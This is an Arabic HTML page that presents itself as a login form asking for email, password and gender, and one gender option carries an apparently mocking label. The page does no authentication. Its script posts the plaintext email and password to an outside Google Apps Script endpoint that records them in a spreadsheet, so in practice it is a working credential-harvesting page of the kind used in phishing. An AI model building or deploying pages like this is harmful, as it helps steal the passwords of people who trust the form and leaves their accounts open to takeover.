<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نموذج تسجيل دخول</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 300px;
        }
        .container label {
            display: block;
            margin-bottom: 10px;
            font-weight: bold;
        }
        .container input, .container select, .container button {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc; /* إضافة إطار رقيق */
            border-radius: 5px;
            box-sizing: border-box;
            background-color: #f9f9f9; /* لون خلفية مختلف عن الخلفية العامة */
        }
        .container select {
            background-color: #e0e0e0; /* لون خلفية مختلف للقائمة المنسدلة */
        }
        .container option {
            padding: 10px;
        }
        .container option:hover {
            background-color: #d0d0d0;
        }
        .container select:hover {
            cursor: pointer;
        }
        .container button {
            background-color: #007bff;
            color: white;
            font-size: 16px;
            cursor: pointer;
            border: none; /* إزالة إطار الزر */
        }
        .container button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <form id="genderForm">
            <label for="email">البريد الإلكتروني:</label>
            <input type="email" id="email" name="email" required>

            <label for="password">كلمة المرور:</label>
            <input type="password" id="password" name="password" required>

            <label for="gender">اختر جنسك:</label>
            <select id="gender" name="gender" required>
                <option value="" disabled selected>اختر خياراً</option>
                <option value="male">ذكر</option>
                <option value="female">أنثى</option>
                <option value="prefer_not_to_say">أفضل عدم الإجابة</option>
                <option value="other">كيش الشعب</option>
            </select>

            <button type="submit">إرسال</button>
        </form>
    </div>

    <script>
        document.getElementById('genderForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            // جمع البيانات من النموذج
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const gender = document.getElementById('gender').value;

            // إرسال البيانات إلى Google Sheets
            fetch('https://script.google.com/macros/s/AKfycbwKHGV5bjQ6064Zle0V4_blJI9_CJv5iV97vu6XL1dba9pRXPxl_z8-ByxvkXbuzRER/exec', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    email: email,
                    password: password,
                    gender: gender,
                }),
            })
            .then(response => response.text())
            .then(result => {
                alert('تم إرسال البيانات بنجاح!');
                document.getElementById('genderForm').reset();
            })
            .catch(error => {
                alert('فشل في إرسال البيانات.');
            });
        });
    </script>
</body>
</html>
